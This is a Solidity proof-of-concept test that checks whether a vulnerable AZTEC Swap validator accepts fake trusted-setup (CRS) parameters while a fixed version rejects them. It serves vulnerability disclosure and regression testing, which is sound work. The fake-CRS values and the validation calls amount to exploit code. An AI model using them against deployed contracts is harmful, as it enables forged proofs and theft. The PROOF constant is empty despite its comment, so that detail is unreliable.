pragma solidity >=0.5.0 <0.6.0;

import "../src/Swap.sol";
import "../src/SwapFixed.sol";

contract PoC_16736 {
    // Generated with the AZTEC SwapProof transcript: four valid bn128 notes,
    // balanced maker/taker values, and valid challenge/commitment equations.
    bytes internal constant PROOF = hex"";

    function crs(bool fake) internal pure returns (uint[6] memory c) {
        c[0] = uint(0x00164b60d0fa1eab5d56d9653aed9dc7f7473acbe61df67134c705638441c4b9);
        c[1] = uint(0x2bb1b9b55ffdcf2d7254dfb9be2cb4e908611b4adeb4b838f0442fce79416cf0);
        if (fake) {
            c[2] = uint(0x297F1A1DEEF4C8A3709028B95B9C1FDEB4CE09A3113921933D950525D7864716);
            c[3] = uint(0x1241A123193A962F38BD839A4F002F967658A2080E41763FFD20B9A005794F0C);
            c[4] = uint(0xB0254AD2EA7179F031B0C854DD185559417FCFC3AFA5DFBD06565BDACA24C0A);
            c[5] = uint(0x78E97961554D14F31802CF063370F96C3ED42ED2F7EF2F64A6F3C15472580A5);
        } else {
            c[2] = uint(0x0118c4d5b837bcc2bc89b5b398b5974e9f5944073b32078b7e231fec938883b0);
            c[3] = uint(0x260e01b251f6f1c7e7ff4e580791dee8ea51d87a358e038b4efe30fac09383c1);
            c[4] = uint(0x22febda3c0c0632a56475b4214e5615e11e6dd3f96e6cea2854a87d4dacc5e55);
            c[5] = uint(0x04fc6369f7110fe3d25156c1bb9a72859cf2a04641f99ba4ee413c80da6a5fe4);
        }
    }

    function test_vulnerable_accepts_fake_trusted_setup() public {
        Swap vulnerable = new Swap();
        (bool ok,) = address(vulnerable).staticcall(abi.encodeWithSignature(
            "validateSwap(bytes,address,uint256[6])",
            PROOF,
            address(0x1111111111111111111111111111111111111111),
            crs(true)
        ));
        require(ok, "real AZTEC proof rejected by vulnerable validator");
    }

    function test_fixed_rejects_same_fake_setup() public {
        SwapFixed fixedValidator = new SwapFixed();
        (bool ok,) = address(fixedValidator).staticcall(abi.encodeWithSignature(
            "validateSwap(bytes,address,uint256[6])",
            PROOF,
            address(0x1111111111111111111111111111111111111111),
            crs(true)
        ));
        require(!ok, "fixed validator accepted fake CRS");
    }
}
